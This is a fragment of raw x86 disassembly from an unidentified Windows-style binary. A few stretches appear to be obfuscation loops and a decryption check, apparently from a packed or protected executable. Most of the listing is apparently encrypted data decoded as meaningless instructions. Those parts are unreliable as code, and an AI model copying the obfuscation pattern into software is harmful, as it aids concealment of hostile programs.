  40940f:	mov    al,BYTE PTR [ecx+0x24]
  409412:	or     ebx,ecx
  409414:	pop    esp
  409415:	retf   
  409416:	gs sbb DWORD PTR es:[ebp-0x18],0xc53633f9
  40941f:	add    BYTE PTR [eax],0x96
  409422:	in     eax,0x72
  409424:	add    al,0x36
  409426:	jne    0x4093cb
  409428:	and    al,0xd2
  40942a:	inc    esi
  40942b:	(bad)  
  40942c:	ja     0x409431
  40942e:	add    al,0x8d
  409430:	jg     0x40949a
  409432:	imul   ebx,ebp,0x7778dc24
  409438:	sbb    ch,BYTE PTR [edx-0x71]
  40943b:	int3   
  40943c:	inc    edx
  40943d:	ins    BYTE PTR es:[edi],dx
  40943e:	inc    edi
  40943f:	in     eax,dx
  409440:	jmp    0x472ff41e
  409445:	sbb    al,0x26
  409447:	mov    ?,edx
  409449:	sbb    eax,0x5f869f2e
  40944e:	(bad)  
  40944f:	ret    
  409450:	add    eax,0xcb31576a
  409455:	cdq    
  409456:	mov    bl,BYTE PTR [ebx]
  409458:	and    al,0x9e
  40945a:	sub    al,0x68
  40945c:	sbb    al,0x1
  40945e:	push   cs
  40945f:	add    DWORD PTR [edx-0x72cbe008],0xffffffd2
  409466:	out    0xe5,al
  409468:	daa    
  409469:	clc    
  40946a:	push   cs
  40946b:	jg     0x40944c
  40946d:	inc    ebp
  40946e:	fwait
  40946f:	das    
  409470:	cwde   
  409471:	test   al,ah
  409473:	cmp    eax,edi
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	stos   DWORD PTR es:[edi],eax
  40947e:	cmp    BYTE PTR [ebx+0x0],al
  409481:	add    BYTE PTR [eax],al
  409483:	add    BYTE PTR [eax],al
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x4338ab
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x4338ab,ecx
  409494:	cmp    DWORD PTR ds:0x4338ab,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x4338ab,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433793,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x4337f7,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x4337f7
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x4337f7,ebx
  4094f1:	cmp    DWORD PTR ds:0x4337f7,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x4337f7,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x4337fb,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x4337fb
  409532:	inc    eax
  409533:	mov    ds:0x4337fb,eax
  409538:	cmp    DWORD PTR ds:0x4337fb,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x4337fb,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x4337fb,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x4337fb
  40956d:	inc    eax
  40956e:	mov    ds:0x4337fb,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x433837,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x4337a3,0x433793
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x4337b3,0x4338af
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x6ae1a30b
  4095d3:	cli    
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	and    DWORD PTR ds:0x6be58ca8,esi
  4095e2:	xlat   BYTE PTR ds:[ebx]
  4095e3:	push   ebx
  4095e4:	call   ebx
  4095e6:	cld    
  4095e7:	adc    cl,BYTE PTR [eax+0x4dd9386c]
  4095ed:	nop
  4095ee:	mov    BYTE PTR [ebp+0x70],0x71
  4095f2:	xchg   edx,eax
  4095f3:	pusha  
  4095f4:	stos   DWORD PTR es:[edi],eax
  4095f5:	sub    ch,bl
  4095f7:	mov    ebx,DWORD PTR [ebx+0x35abbc13]
  4095fd:	loop   0x409657
  4095ff:	adc    ah,BYTE PTR [edx-0x22]
  409602:	dec    ebp
  409603:	xor    ecx,ecx
  409605:	push   edi
  409606:	cmp    eax,0xc0cb93a0
  40960b:	mov    ds,WORD PTR [ecx+0x69130eac]
  409611:	and    BYTE PTR [ecx+0x3ea1715],0xf2
  409618:	xor    al,0xfe
  40961a:	fsub   DWORD PTR [eax]
  40961c:	pop    edi
  40961d:	aas    
  40961e:	js     0x4095f2
  409620:	aaa    
  409621:	mov    ds:0x3ef6f158,ax
  409627:	or     DWORD PTR [ebx-0x5bbf79df],ebp
  40962d:	or     ebx,DWORD PTR [edi+0x2e8e2562]
  409633:	mov    ecx,0x2580c514
  409638:	jno    0x409671
  40963a:	arpl   WORD PTR [ebx],dx
  40963c:	pop    ebx
  40963d:	xor    al,0x21
  40963f:	xchg   edx,eax
  409640:	repz fild QWORD PTR ds:0xa2fdaf2c
  409647:	leave  
  409648:	ret    0x94d5
  40964b:	out    dx,al
  40964c:	mov    cl,0x5c
  40964e:	sti    
  40964f:	push   0x535589d5
  409654:	pop    ss
  409655:	in     al,0x8d
  409657:	dec    ebx
  409658:	dec    esi
  409659:	jae    0x409697
  40965b:	std    
  40965c:	xlat   BYTE PTR ds:[ebx]
  40965d:	jmp    0x409674
  40965f:	jae    0x4096d3
  409661:	scas   al,BYTE PTR es:[edi]
  409662:	jmp    0x4fa706e3
  409667:	lods   eax,DWORD PTR ds:[esi]
  409668:	data16 add al,BYTE PTR [eax+0x6ecf92b1]
  40966f:	retf   0xbf6b
  409672:	(bad)  
  409673:	push   edi
  409674:	jne    0x4096d9
  409676:	popa   
  409677:	pusha  
  409678:	jle    0x4096c8
  40967a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967b:	xchg   BYTE PTR [ebp-0x34],cl
  40967e:	xchg   esi,eax
  40967f:	or     eax,0xcbd8e00c
  409684:	int3   
  409685:	scas   al,BYTE PTR es:[edi]
  409686:	xchg   ecx,eax
  409687:	add    ch,al
  409689:	arpl   WORD PTR [eax],bp
  40968b:	cli    
  40968c:	add    esi,DWORD PTR [ecx+edi*8-0x33]
  409690:	in     eax,dx
  409691:	retf   0xa8c4
  409694:	xchg   edx,eax
  409695:	int    0x4b
  409697:	dec    edx
  409698:	aam    0x3c
  40969a:	dec    ebp
  40969b:	inc    ebx
  40969c:	in     eax,dx
  40969d:	push   0x94787977
  4096a2:	inc    edi
  4096a3:	sub    eax,0xded1fe1f
  4096a8:	cli    
  4096a9:	lods   eax,DWORD PTR ds:[esi]
  4096aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ab:	cmp    bl,0x58
  4096ae:	fcmovbe st,st(6)
  4096b0:	fs loop 0x4096e7
  4096b3:	mov    cl,0x93
  4096b5:	ret    
  4096b6:	sahf   
  4096b7:	imul   eax,ecx,0xffffffbc
  4096ba:	sti    
  4096bb:	mov    ds:0x95465341,eax
  4096c0:	fld    TBYTE PTR [ebp+edi*1+0x40]
  4096c4:	xor    esi,DWORD PTR [edx+0xf]
  4096c7:	jmp    FWORD PTR [edx+0x57]
  4096ca:	nop
  4096cb:	mov    esi,0xa84587d9
  4096d0:	fild   QWORD PTR [esi-0x43]
  4096d3:	add    ah,BYTE PTR [esi]
  4096d5:	push   0x7b
  4096d7:	inc    esi
  4096d8:	lahf   
  4096d9:	xor    BYTE PTR [esi],bh
  4096db:	out    0x9c,eax
  4096dd:	repz sbb DWORD PTR [edi+0x4e],ebp
  4096e1:	mov    edx,0xc1e69a2d
  4096e6:	nop
  4096e7:	icebp  
  4096e8:	addr16 data16 jns 0x4096a6
  4096ec:	or     BYTE PTR [ecx+0x3a],dh
  4096ef:	inc    edx
  4096f0:	ins    DWORD PTR es:[edi],dx
  4096f1:	sbb    edx,DWORD PTR [edx]
  4096f3:	mov    al,0x3d
  4096f5:	mov    al,BYTE PTR [edx-0x47]
  4096f8:	leave  
  4096f9:	add    edx,DWORD PTR [eax+0x1e]
  4096fc:	xchg   edx,eax
  4096fd:	out    0xf5,eax
  4096ff:	out    0xe5,eax
  409701:	sbb    eax,0xd747aea6
  409706:	mov    bh,0x30
  409708:	and    eax,0x16c95bf3
  40970d:	xchg   ecx,eax
  40970e:	mov    al,0x18
  409710:	test   DWORD PTR [edi-0x6f83c1b6],ecx
  409716:	repz inc ecx
  409718:	arpl   bp,cx
  40971a:	jge    0x409720
  40971c:	sahf   
  40971d:	cld    
  40971e:	enter  0xc963,0x3b
  409722:	sub    eax,0x649778f4
  409727:	aaa    
  409728:	inc    edx
  409729:	fs jno 0x409705
  40972c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40972d:	aaa    
  40972e:	push   edi
  40972f:	test   BYTE PTR [edx-0x7e],0x4
  409733:	mov    al,0x69
  409735:	pop    eax
  409736:	pop    ebx
  409737:	not    BYTE PTR [ebx+0x2182d045]
  40973d:	fbld   TBYTE PTR [ebp-0x10bc9da9]
  409743:	adc    ebp,DWORD PTR [esi]
  409745:	or     dh,BYTE PTR [edi-0x1e6411ad]
  40974b:	mov    ?,WORD PTR [ebx]
  40974d:	push   es
  40974e:	inc    esi
  40974f:	arpl   WORD PTR [ebx+edx*2],sp
  409752:	repnz mov ch,0x8f
  409755:	int    0xe9
  409757:	pop    esp
  409758:	test   eax,0x3dad5e7b
  40975d:	pop    esi
  40975e:	in     eax,0x3d
  409760:	test   eax,0x5094b138
  409765:	shl    DWORD PTR [esi-0x37],0xff
  409769:	ret    
  40976a:	cmp    al,0xb6
  40976c:	pop    edx
  40976d:	test   dh,ch
  40976f:	mov    al,ds:0xc9c04f78
  409774:	fidiv  DWORD PTR [ebx+0x9]
  409777:	out    dx,eax
  409778:	push   edx
  409779:	mov    edx,0x5422f208
  40977e:	mov    ch,0xb5
  409780:	mov    ds:0x93d53c21,eax
  409785:	xchg   esp,eax
  409786:	sbb    DWORD PTR [edx],ebp
  409788:	hlt    
  409789:	xor    al,0x50
  40978b:	mov    cl,0xc7
  40978d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40978f:	cmp    DWORD PTR [edi],esp
  409791:	or     BYTE PTR [edx-0x19],0xf9
  409795:	jmp    0xfc446294
  40979a:	retf   0x2a85
  40979d:	std    
  40979e:	gs scas al,BYTE PTR es:[edi]
  4097a0:	aas    
  4097a1:	out    dx,al
  4097a2:	imul   edi,DWORD PTR [edx-0x59e3dadd],0xf1e376e2
  4097ac:	cmp    al,BYTE PTR [eax]
  4097ae:	lods   eax,DWORD PTR ds:[esi]
  4097af:	sbb    BYTE PTR [ebp-0x603b56b3],0x97
  4097b6:	fdivr  QWORD PTR [esi-0x7eb6268a]
  4097bc:	idiv   DWORD PTR [eax-0x30a69df3]
  4097c2:	sar    DWORD PTR [esp+ecx*4],0xb4
  4097c6:	lahf   
  4097c7:	ret    
  4097c8:	xchg   BYTE PTR [ecx],dl
  4097ca:	js     0x4097f2
  4097cc:	aad    0xfe
  4097ce:	cmp    DWORD PTR [ebp+0x6a],ebx
  4097d1:	shl    bh,cl
  4097d3:	das    
  4097d4:	popf   
  4097d5:	cmovl  edx,edi
  4097d8:	inc    esp
  4097d9:	cdq    
  4097da:	test   eax,0x573794e0
  4097df:	out    dx,al
  4097e0:	dec    edi
  4097e1:	or     esp,0xffffffa0
  4097e4:	in     eax,dx
  4097e5:	xor    al,0xf2
  4097e7:	push   0x8
  4097e9:	imul   ebx,ebp,0xffffff89
  4097ec:	mov    ebx,0xf6c85938
  4097f1:	mov    ebx,0xf7bba606
  4097f6:	aaa    
  4097f7:	inc    ecx
  4097f8:	adc    BYTE PTR [ecx],dl
  4097fa:	fstp   QWORD PTR [esi-0x150aa959]
  409800:	push   0x1f745ead
  409805:	mov    esp,0xce0b483b
  40980a:	mov    cl,0x74
  40980c:	adc    DWORD PTR [ecx+0x16],ebx
  40980f:	push   eax
  409810:	aam    0xc
  409812:	push   ebp
  409813:	and    al,0xf3
  409815:	ds in  al,0xd0
  409818:	adc    ebp,eax
  40981a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981b:	daa    
  40981c:	call   0xd231a65f
  409821:	dec    eax
  409822:	retf   
  409823:	loop   0x40982d
  409825:	mov    dh,0xb
  409827:	call   0x953b:0xd66de5d7
  40982e:	out    0x51,al
  409830:	or     BYTE PTR [edi],cl
  409832:	cs rcr bh,cl
  409835:	push   cs
  409836:	xor    BYTE PTR [eax+0x2b94a0ff],0x85
  40983d:	sub    BYTE PTR [ebp-0x5dbc52ce],ch
  409843:	pushf  
  409844:	ret    
  409845:	mov    esi,0xad3c5ece
  40984a:	lock ds inc esi
  40984d:	adc    BYTE PTR [edx],bh
  40984f:	cmp    al,0x95
  409851:	pusha  
  409852:	dec    edi
  409853:	mov    eax,0x1c96b875
  409858:	xchg   esi,eax
  409859:	inc    ebp
  40985a:	jbe    0x4098c9
  40985c:	das    
  40985d:	int    0x85
  40985f:	sub    eax,DWORD PTR gs:[ebx]
  409862:	(bad)  
  409864:	dec    edi
  409865:	into   
  409866:	push   edi
  409867:	cmp    DWORD PTR [edi+0x3ae0481c],ecx
  40986d:	dec    edx
  40986e:	and    DWORD PTR [eax],ecx
  409870:	mov    al,gs:0x29fbdc6a
  409876:	jne    0x409877
  409878:	jl     0x409833
  40987a:	test   BYTE PTR [esi-0xcf5c2e0],dl
  409880:	mov    ds:0x1845faab,al
  409885:	jecxz  0x4098c2
  409887:	aad    0x88
  409889:	sub    eax,0x376fb916
  40988e:	bound  esp,QWORD PTR [ebp+0x53]
  409891:	call   0xf4dbc91
  409896:	dec    ebx
  409897:	icebp  
  409898:	test   eax,0x1acd570c
  40989d:	loop   0x409902
  40989f:	shl    DWORD PTR [ebx-0x25],cl
  4098a2:	das    
  4098a3:	xor    al,0xb1
  4098a5:	lds    esi,FWORD PTR [ecx+0x781e55f0]
  4098ab:	jge    0x409893
  4098ad:	imul   edi,edx,0xffffffbe
  4098b0:	iret   
  4098b1:	sbb    eax,0xd67c9640
  4098b6:	std    
  4098b7:	dec    ecx
  4098b8:	dec    DWORD PTR [edx+ecx*2-0x63ee65ec]
  4098bf:	jo     0x409940
  4098c1:	daa    
  4098c2:	pop    ebp
  4098c3:	mov    ebx,DWORD PTR [ecx+0x58]
  4098c6:	dec    esi
  4098c7:	fwait
  4098c8:	jl     0x409905
  4098ca:	dec    edi
  4098cb:	mov    ds:0xb72e1000,eax
  4098d0:	dec    ebx
  4098d1:	inc    ebp
  4098d2:	sub    al,0x31
  4098d4:	and    al,0x2a
  4098d6:	xchg   esi,eax
  4098d7:	ret    0xe67b
  4098da:	out    0xe0,eax
  4098dc:	adc    al,0x1c
  4098de:	xchg   ecx,eax
  4098df:	test   eax,0x81c9b70f
  4098e4:	sbb    eax,0x4338bb
  4098e9:	and    ebx,DWORD PTR [edx+0x0]
  4098ec:	add    BYTE PTR [ebx],al
  4098ee:	or     BYTE PTR [ecx],dl
  4098f0:	sbb    eax,0x433827
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x4337b7
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x4337ef,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x4337ef
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x4337ef,ecx
  409918:	cmp    DWORD PTR ds:0x4337ef,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x4337ef,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x433827,0x11
  40994a:	cmp    DWORD PTR ds:0x433827,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x433827,0x6
  40995e:	jne    0x409977
  409964:	push   0x433924
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x433827,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x433827
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x433827,ecx
  409991:	mov    ecx,DWORD PTR ds:0x433827
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x433827,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fnstsw WORD PTR [edi+0x5b]
  4099bf:	aaa    
  4099c0:	popa   
  4099c1:	push   0x7a7e7ee4
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099f0
  4099ca:	imul   edi,DWORD PTR [edi-0x11],0x1f
  4099ce:	pop    edx
  4099cf:	call   0x6bd3b34b
  4099d4:	cmc    
  4099d5:	jmp    0xa2cb:0x7719c177
  4099dc:	(bad)  
  4099dd:	sub    al,0x9
  4099df:	sub    bh,BYTE PTR [edi]
  4099e1:	lea    edi,[edx+0x3906a8da]
  4099e7:	and    DWORD PTR [esi+0x41],0x934123ad
  4099ee:	pop    ebp
  4099ef:	mov    dh,0xe3
  4099f1:	or     ch,BYTE PTR [edx+edi*8-0x65204710]
  4099f8:	pop    eax
  4099f9:	imul   edi,DWORD PTR [eax+0x38],0x71
  4099fd:	sti    
  4099fe:	mov    ds:0x293020bf,al
  409a04:	mov    ds:0x7cd976ab,eax
  409a09:	xchg   BYTE PTR [ebp+eiz*2-0x15],dh
  409a0d:	or     BYTE PTR [esi+ebp*2],bh
  409a10:	xor    edx,DWORD PTR [eax+eax*2+0x4b5a98b]
  409a17:	cwde   
  409a18:	test   edi,ecx
  409a1a:	push   ebx
  409a1b:	jg     0x4099de
  409a1d:	clc    
  409a1e:	jb     0x409a1b
  409a20:	dec    ebp
  409a21:	pop    ds
  409a22:	push   esi
  409a23:	ret    0x3d67
  409a26:	or     DWORD PTR [eax-0x52],ebx
  409a29:	dec    eax
  409a2a:	cmp    BYTE PTR ds:0x5bbfb8e0,dh
  409a30:	sahf   
  409a31:	sub    DWORD PTR [eax+ebp*4-0x5f1def49],esi
  409a38:	fst    QWORD PTR [eax]
  409a3a:	cdq    
  409a3b:	xchg   BYTE PTR [ecx+ebx*4+0x2b],bl
  409a3f:	out    dx,al
  409a40:	sbb    DWORD PTR [ebx-0x7e11c406],esp
  409a46:	inc    esp
  409a47:	movq   mm3,QWORD PTR [esi+0x63247fcd]
  409a4e:	je     0x409a04
  409a50:	shl    DWORD PTR [ebp+0xece6fc0],1
  409a56:	mov    esp,DWORD PTR [ecx]
  409a58:	fwait
  409a59:	or     cl,BYTE PTR [ebx-0xbae5e2a]
  409a5f:	ds into 
  409a61:	push   0x66bae6ba
  409a66:	mov    ds:0x39f59e78,al
  409a6b:	and    edx,DWORD PTR [ecx]
  409a6d:	xchg   ebx,eax
  409a6e:	ror    BYTE PTR [eax+0x5b],0xa9
  409a72:	call   0xe26a:0xf7dc34fe
  409a79:	xor    DWORD PTR [esi+0x7343b1d5],edx
  409a7f:	pop    eax
  409a80:	push   ss
  409a81:	sbb    ah,ah
  409a83:	sbb    ch,BYTE PTR [ebx-0x10]
  409a86:	inc    edi
  409a87:	arpl   sp,cx
  409a89:	add    DWORD PTR [ebp+0x40],esp
  409a8c:	xor    DWORD PTR [ebx+edx*8-0x4e74042],0xffffffaf
  409a94:	sub    ecx,DWORD PTR [ecx]
  409a96:	pusha  
  409a97:	add    al,0x13
  409a99:	data16 (bad) 
  409a9b:	(bad)
  409a9e:	xchg   esp,eax
  409a9f:	xor    al,0x6d
  409aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aa2:	clc    
  409aa3:	cli    
  409aa4:	xchg   bh,ch
  409aa6:	mov    cl,0x7a
  409aa8:	and    al,ch
  409aaa:	aaa    
  409aab:	data16 jge 0x409a5f
  409aae:	add    ah,BYTE PTR [edx-0x28]
  409ab1:	mov    ebp,0x50837095
  409ab6:	pushf  
  409ab7:	popa   
  409ab8:	push   es
  409ab9:	cld    
  409aba:	xchg   esi,eax
  409abb:	mov    bl,0xcd
  409abd:	mov    bh,0x69
  409abf:	aas    
  409ac0:	(bad)  
  409ac1:	sar    BYTE PTR [ebx-0x6042a47b],1
  409ac7:	push   es
  409ac8:	sar    DWORD PTR [ecx],cl
  409aca:	mov    bh,0xec
  409acc:	pop    ds
  409acd:	mov    esp,0x7984c0c7
  409ad2:	jg     0x409b11
  409ad4:	or     eax,0x7cf81bb3
  409ad9:	rol    eax,1
  409adb:	and    cl,BYTE PTR [ecx]
  409add:	outs   dx,BYTE PTR ds:[esi]
  409ade:	lods   eax,DWORD PTR ds:[esi]
  409adf:	sbb    eax,0xe44b1c23
  409ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae5:	jle    0x409aeb
  409ae7:	pop    edi
  409ae8:	popa   
  409ae9:	jecxz  0x409ae6
  409aeb:	pop    ss
  409aec:	int3   
  409aed:	inc    edi
  409aee:	in     eax,dx
  409aef:	pop    ecx
  409af0:	and    bl,BYTE PTR [eax+0x68]
  409af3:	jge    0x409afd
  409af5:	inc    edx
  409af6:	mov    edi,0x4ae9bdb4
  409afb:	scas   al,BYTE PTR es:[edi]
  409afc:	inc    esp
  409afd:	mov    dl,0x47
  409aff:	pop    eax
  409b01:	clc    
  409b02:	repnz dec esp
  409b04:	sub    eax,0xe475ecf9
  409b09:	ss pop esi
  409b0b:	push   edx
  409b0c:	scas   eax,DWORD PTR es:[edi]
  409b0d:	jns    0x409ab0
  409b0f:	or     al,0x1e
  409b11:	fisttp DWORD PTR [edx]
  409b13:	lods   al,BYTE PTR ds:[esi]
  409b14:	fimul  DWORD PTR [edi]
  409b16:	arpl   WORD PTR [esi],di
  409b18:	jmp    0x800b48bb
  409b1d:	retf   0x18a0
  409b20:	data16 mov ah,0xb
  409b23:	jno    0x409b00
  409b25:	into   
  409b26:	retf   0x639e
  409b29:	xchg   ecx,eax
  409b2a:	bound  esi,QWORD PTR [ebp-0x3575cec4]
  409b30:	push   esi
  409b31:	outs   dx,BYTE PTR ds:[esi]
  409b32:	xor    eax,0x487c901
  409b37:	jne    0x409b45
  409b39:	mov    bh,0xf0
  409b3b:	popf   
  409b3c:	jno    0x409adf
  409b3e:	xchg   edx,eax
  409b3f:	cmp    BYTE PTR [edx+0x71],ch
  409b42:	mov    WORD PTR [edi+0xce545a],?
  409b48:	mov    ecx,0x61ad0313
  409b4d:	jl     0x409baa
  409b4f:	jbe    0x409b6c
  409b51:	es or  al,0xbc
  409b54:	je     0x409b55
  409b56:	ret    
  409b57:	movaps xmm4,XMMWORD PTR [eax+0xb]
  409b5b:	sub    eax,0xbdd42c7a
  409b60:	(bad)  
  409b61:	js     0x409b09
  409b63:	push   ds
  409b64:	push   0x1059db39
  409b69:	cmp    edi,DWORD PTR [esi-0x38]
  409b6c:	jecxz  0x409bb3
  409b6e:	gs inc ebx
  409b70:	popa   
  409b71:	lahf   
  409b72:	adc    ecx,DWORD PTR [edi+ecx*4]
  409b75:	xchg   cl,bh
  409b77:	test   DWORD PTR [esi],0x54cb499
  409b7d:	loope  0x409bb3
  409b7f:	gs (bad) 
  409b81:	cmc    
  409b82:	fcomp  QWORD PTR [ebx]
  409b84:	push   es
  409b85:	xor    eax,0x23fd41d5
  409b8a:	xchg   ebx,eax
  409b8b:	retf   
  409b8c:	mov    BYTE PTR [ecx],dh
  409b8e:	mov    esi,0xac223244
  409b93:	mov    edx,0x9cb3168f
  409b98:	push   ebp
  409b99:	mov    al,ds:0xa959f209
  409b9e:	jg     0x409c0c
  409ba0:	pop    edx
  409ba1:	lods   al,BYTE PTR ds:[esi]
  409ba2:	into   
  409ba3:	pop    esp
  409ba4:	ss popf 
  409ba6:	mov    ds:0x9985a739,al
  409bab:	xor    esp,DWORD PTR [ecx+0x4268dd36]
  409bb1:	stc    
  409bb2:	push   ebx
  409bb3:	adc    ebp,ebx
  409bb5:	jmp    DWORD PTR [edx]
  409bb7:	dec    edx
  409bb8:	stos   BYTE PTR es:[edi],al
  409bb9:	ret    0x4702
  409bbc:	addr16 mov bh,0xbf
  409bbf:	ins    DWORD PTR es:[edi],dx
  409bc0:	and    edi,ebx
  409bc2:	out    0xe0,eax
  409bc4:	fsub   QWORD PTR [ebp-0x1]
  409bc7:	inc    eax
  409bc8:	push   es
  409bc9:	push   es
  409bca:	aam    0xe0
  409bcc:	sbb    edi,ebx
  409bce:	xor    esp,DWORD PTR [esi+0x2d466388]
  409bd4:	nop
  409bd5:	sar    DWORD PTR [ecx-0x3e69ced4],0x95
  409bdc:	cmp    BYTE PTR [esi-0x276b54b],bl
  409be2:	adc    al,BYTE PTR [esi-0x40]
  409be5:	or     eax,0x355e7ca2
  409bea:	add    al,0x58
  409bec:	jl     0x409ba5
  409bee:	jle    0x409bb1
  409bf0:	test   bl,ch
  409bf2:	gs popf 
  409bf4:	retf   0xee80
  409bf7:	int    0x5a
  409bf9:	mov    ebp,0xd2bf565e
  409bfe:	outs   dx,DWORD PTR ds:[esi]
  409bff:	test   eax,edx
  409c01:	stos   BYTE PTR es:[edi],al
  409c02:	mov    ds:0x60698c3b,eax
  409c07:	or     bl,ah
  409c09:	push   esi
  409c0a:	(bad)  
  409c0b:	push   0x74
  409c0d:	neg    BYTE PTR [ebx+0x7f]
  409c10:	add    ebp,DWORD PTR [ebx-0x42]
  409c13:	inc    esp
  409c14:	mov    esi,0x38010a86
  409c19:	fwait
  409c1a:	mov    ecx,0x6ddfcb8a
  409c1f:	(bad)  [ebp-0x5]
  409c22:	aas    
  409c23:	cwde   
  409c24:	ds dec ecx
  409c26:	sub    ah,BYTE PTR [esi+0x6c]
  409c29:	xor    al,0xc4
  409c2b:	jmp    0xdfdfd658
  409c30:	inc    ebx
  409c31:	jb     0x409c94
  409c33:	inc    ebp
  409c34:	and    al,0x31
  409c36:	adc    esi,DWORD PTR [ebp-0x2e]
  409c39:	push   ss
  409c3a:	sbb    ah,ch
  409c3c:	mov    dh,0x9b
  409c3e:	or     eax,0xb79d7aca
  409c43:	shr    DWORD PTR [edx-0x17b0a7d6],cl
  409c49:	push   ebp
  409c4a:	sbb    DWORD PTR [eax],ebp
  409c4c:	daa    
  409c4d:	inc    ebx
  409c4e:	mov    ah,0xdd
  409c50:	dec    ecx
  409c51:	and    DWORD PTR [ebx],ebp
  409c53:	clc    
  409c54:	pushf  
  409c55:	data16 sbb BYTE PTR [edi+edi*4-0x6d7a87d7],ah
  409c5d:	inc    ebp
  409c5e:	and    eax,0x6deb5627
  409c63:	lds    edi,FWORD PTR [edx]
  409c65:	lea    ebp,[ebx+0x753ce9c9]
  409c6b:	jno    0x409c48
  409c6d:	(bad)  
  409c6e:	hlt    
  409c6f:	dec    ebx
  409c70:	or     eax,esi
  409c72:	cmova  eax,DWORD PTR [edi-0x1da4ed3c]
  409c79:	xlat   BYTE PTR ds:[ebx]
  409c7a:	jl     0x409c29
  409c7c:	mov    edi,ecx
  409c7e:	pop    ecx
  409c7f:	cld    
  409c80:	call   0xb19c:0xf33bed1d
  409c87:	push   gs
  409c89:	daa    
  409c8a:	mov    cl,0x7c
  409c8c:	add    BYTE PTR [edx],0x8d
  409c8f:	pop    esi
  409c90:	push   ds
  409c91:	xchg   edi,eax
  409c92:	cs pop esp
  409c94:	jns    0x409c9e
  409c96:	imul   BYTE PTR [edi+0x6fa7062f]
  409c9c:	mov    ch,0x42
  409c9e:	jnp    0x409c50
  409ca0:	mov    al,ds:0xe3039288
  409ca5:	bound  esi,QWORD PTR [edx-0x19f6ce2]
  409cab:	xor    ah,BYTE PTR [esi]
  409cad:	xchg   ebx,eax
  409cae:	ds out 0x40,eax
  409cb1:	mov    dl,0x9e
  409cb3:	loope  0x409d17
  409cb5:	lods   al,BYTE PTR ds:[esi]
  409cb6:	xchg   ebp,eax
  409cb7:	pop    ebx
  409cb8:	push   ebx
  409cb9:	cmp    edx,DWORD PTR [esi+0xc]
